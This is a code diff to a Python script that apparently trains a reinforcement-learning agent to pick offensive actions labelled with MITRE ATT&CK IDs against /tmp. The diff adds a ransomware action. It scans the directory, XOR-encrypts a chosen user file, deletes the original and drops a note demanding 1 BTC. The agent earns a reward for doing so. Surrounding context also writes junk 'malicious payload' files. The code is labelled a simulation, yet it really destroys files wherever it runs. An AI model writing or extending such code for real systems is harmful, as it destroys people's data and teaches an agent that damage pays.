@@ -19,7 +19,7 @@ STATE_FILE = os.path.join(BASE_DIR, "war_state.json")
 TARGET_DIR = "/tmp"
 
 # --- AI HYPERPARAMETERS ---
-ACTIONS = ["T1046_RECON", "T1027_OBFUSCATE", "T1003_ROOTKIT", "T1589_LURK", "T1036_MASQUERADE"]
+ACTIONS = ["T1046_RECON", "T1027_OBFUSCATE", "T1003_ROOTKIT", "T1589_LURK", "T1036_MASQUERADE", "T1486_ENCRYPT"]
 ALPHA = 0.4
 ALPHA_DECAY = 0.9999
 GAMMA = 0.9
@@ -129,6 +129,40 @@ def engage_offense():
                     with open(fname, 'wb') as f:
                         f.write(b"StaticMaliciousPayload" * 50 + b"\x00\xff" * 50)
                     impact = 2
+                except: pass
+
+            elif action == "T1486_ENCRYPT":
+                # Ransomware: Find user files, encrypt them, demand ransom
+                try:
+                    targets = []
+                    with os.scandir(TARGET_DIR) as entries:
+                        for entry in entries:
+                            # Target visible files that aren't our malware or already encrypted
+                            if entry.is_file() and not entry.name.startswith(("malware_", ".sys_", "RANSOM_")):
+                                if not entry.name.endswith(".enc"):
+                                    targets.append(entry.path)
+
+                    if targets:
+                        target = random.choice(targets)
+                        new_name = target + ".enc"
+
+                        # "Encrypt" (Simple XOR for simulation)
+                        with open(target, 'rb') as f_in:
+                            data = f_in.read()
+
+                        encrypted_data = bytearray([b ^ 0x42 for b in data])
+
+                        fd = os.open(new_name, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+                        with os.fdopen(fd, 'wb') as f_out:
+                            f_out.write(encrypted_data)
+
+                        os.remove(target)
+
+                        # Drop Note
+                        note = os.path.join(TARGET_DIR, f"RANSOM_NOTE_{uuid.uuid4()}.txt")
+                        with open(note, 'w') as f: f.write("YOUR FILES ARE ENCRYPTED. PAY 1 BTC.")
+
+                        impact = 5
                 except: pass
 
             # 4. REWARDS
